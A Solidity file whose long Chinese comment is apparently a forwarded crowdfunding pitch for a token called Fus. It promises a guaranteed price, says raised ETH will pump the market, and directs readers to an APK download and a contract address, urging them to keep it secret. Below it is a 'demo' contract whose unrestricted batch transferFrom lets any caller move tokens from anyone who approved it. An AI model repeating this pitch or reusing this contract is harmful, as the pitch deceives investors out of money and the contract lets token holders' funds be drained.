pragma solidity ^0.4.25;

/*
* 转自马三多：
* 亲爱的ADC家人们  大家好 我是三多 
* 很高兴与大家再一次以另一种形式分享。大家肯定会质疑我为什么以这种方式与大交流，
* 没办法你们懂得，不过在未来10天内我们将打脸那些诋毁、质疑我们的人！
* 在国庆节前我要把重磅好消息分享给大家，我们的Fus正式版也就是公链主线终于在昨天提前完成，
* 多少个日日夜夜的付出终于有了回报，真的在10号到现在将近20天我没有睡眠超过4个小时，
* 现在凌晨1点多我们还在加班，真的真的很难熬，我们的技术团队为了Fus公链每天都在加班，
* 业务团队也全员走访了巴黎、罗马、马来西亚、雅加达、图雷亚、巴厘岛、杜塞尔多夫等国外大城市。
* 目的是在这些城市中洽谈大型的数字货币交易所，只有与更多的国外大型交易所洽谈成功上线，
* 我们的Fus才更有价值，简单的数字货币上线其实钱和白皮书就足够，
* 但是我们的目标、我们的定位更大、更远。我们是要做上线就成为技术全球第一，市值全球第二的数字货币，
* 只有我们的Fus正式版上线交易所后，所面临的一切困难都将解决。
* 现在我很有信心的跟各位ADC的家人们说Fus正式版也就是Fus公链主线将于国庆节过后第一天10月8日在主流交易所上线交易，
* 具体交易所我会提前一天公布，给大家留出注册时间，目前还请大家先熟悉一下目前主流交易所APP的操作。
* 我钱包里的以太坊和我全部的流动资金以及Fus正式版众筹平台筹到的以太坊全部用于前期拉盘，
* 到时我向大家保证咱们每个Fus价值不会低于200（后面的单位留点悬念），上交易所后还请大家不要急于套现砸盘，
* 虽然我们资金准备充足，但是还请大家在Fus大涨后再逐步套现，如不急需资金周转我建议大家不要抛售，
* 继续持有将带来更大收益，因为我们持有的Fus就相当于ADC的股权，也许我美国行之后它的价值会更高，
* 我请了顶尖的团队进行操盘，上交易所后Fus的价值会直线上升，我非常有信心咱们的Fus年内市值超过比特币成为市值第一。
* 下面我讲的话很重要请多看几遍
* 主链上线后为体现FUS的价值发行总量由原来的2亿，销毁到了1500万，所以莲蓉包现在正在与主链升级对接中，
* 除去我持有的旧FUS莲蓉包内现存的200多万旧Fus将于10月8日，1：1在莲蓉包兑换窗口兑换为正式版Fus。
* 同时通过ADC家人的反映，其实大部分会员们所持有的Fus很少，甚至很多会员没有。
* 在今天凌晨2点至10月2日凌晨2点，我们将开启为期四天的Fus众筹，众筹总量定为600万，抢完为止，
* 众筹结束后我将关闭平台进行为期5天的主链升级对接，直到8日凌晨开启。还有BIIGO商城的GO币主链也正在积极推进中，
* 预计10月下旬完成。BIIGO商城的事等我从美国回来我再跟大家分享。
* 众筹规则
* 考虑到去装币平台暂时不能开启，目前我们将通过以太坊进行众筹，众筹得到的以太坊将用于上线交易所后拉盘使用。
* 10月下旬待去装币众筹平台APP制作完成后我们将通过C币开启下一轮众筹按交易所市价进行兑换如交易所FUS市价为2000将需要2000个C币进行兑换，总量为300万。
* 现在大家需要下载地址：http://chunchou.com/fuschain.apk  
* 备用下载地址：https://github.com/fuschain/fuschain.github.io/releases/download/2.0/fuschain.apk 
* 下载我们技术团队制作的 Fus正式版众筹平台APP，为赶上交易所上线前让大家都持有FUS，
* FUS正式版众筹平台制作的非常急只制作出了安卓版，还存在一些无关紧要的BUG，但是大家不要担心，
* APP是基于区块链技术制作的即使有些界面有显示错误将APP关掉重新打开就好了，区块链合约已经生成，不会造成任何影响。
* 因为莲蓉包正在紧急维护升级中，所以我们找了其它主流钱包进行暂时替代，第一打开APP后创建或导入钱包，
* 第二等待Fus正式版众筹平台弹出自动进入，如白屏关闭APP从新打开。第三众筹期间众筹到的FUS可在平台内转移到其他钱包。
* 第四团队参考LW做了分红系统，就是在众筹期间凡是钱包内持有正式版Fus的都将会持续享受ETH分红。第五参考LW做了优先抢购系统。
* 第六增加随时兑换ETH出局系统，如果大家在众筹期间受外界如天机等份子诋毁、质疑对Fus失去信心不想持有了，
* 众筹期间也可随时兑换ETH出局，也好给别的家人众筹抢购的机会，众筹期间如抢购人数众多，
* 导致网络拥堵可用众筹平台APP内置钱包或imToken钱包把自定义打开gwei填10， Gas填150000再进行转账，
* 转到合约地址0x328C56A62768913b845c7864d46941c46b93d475进行购买，Fus将自动按照平台时时数量发送到平台内。
* 还有我请大家不要把全部的身心都放在Fus上，应该投入更多的热情放在c币商城这个项目上，C币商城是帮助咱们C币消除泡沫的，
* 只要C币能够在商城中流通并且通过大家的蚁群传播去宣传让更多的人去购买使用，
* 即使去装币平台与矿机开不了，我也会以另外一种ZF允许的方式给大家的C币变现并伴有高额的回报。
* 继续持有将带来更大收益，因为我们持有的Fus就相当于ADC的股权，也许我美国行之后它的价值会更高，
* 最后我还要说几点，Fus正式版众筹交易平台，不要传到外面。Fus正式版众筹交易平台是为了我们ADC家人们的福利投资千万紧急开发的，
* 因BIIGO商城与LW币主链将陆续完成，在1-2个月内还会开通GO币、LW币等众筹，为了家人们的利益平台APP一定不要外传，
* 因为平台基于区块链技术做的，控制不了参与众筹的人员。如果你外传会造成其他人员大量进场抢购Fus，
* 使我们自己的会员抢购不到，同时也会使我们的资金大量外流，这是非常愚蠢的。
* 明天我将去美国为家人们谈件大事，期间不会再给大家分享消息，预计10月5日回来，到时我将给大家分享一件更大的喜事，家人们一定要准备好香槟等着我。
* 家人们这么久的坚持终将获得回报。我们幕后的人员不久也会走上前台，为ADC的家人保驾护航一起走下去。请相信我，我们的未来马上就要实现。
* 还有这段时间由于我不能及时出现，我一直授意我们技术团队的工作人员按照我的想法进行代笔，但是有些分享确实不是我们工作人员发出的，
* 我怀疑有位团队高级领导人一直在冒充我，虽然我知道你对ADC也许没有恶意，但是不要再冒充我了好吧，各位领导人如有疑问请发信息给我以下邮箱，
* 并备注上你的微信号与姓名，10月5日美国洽谈回来后，我将以邮件方式回复大家心中的疑问，还将与你们讲述未来1个月内我们将如何起飞。
* 联系邮箱：<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d4b2b6ede4b0a2bae6e7e394a4a6bba0bbbab9b5bdb8fab7bbb9">[email&#160;protected]</a>
*/

contract demo{
    
    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }
}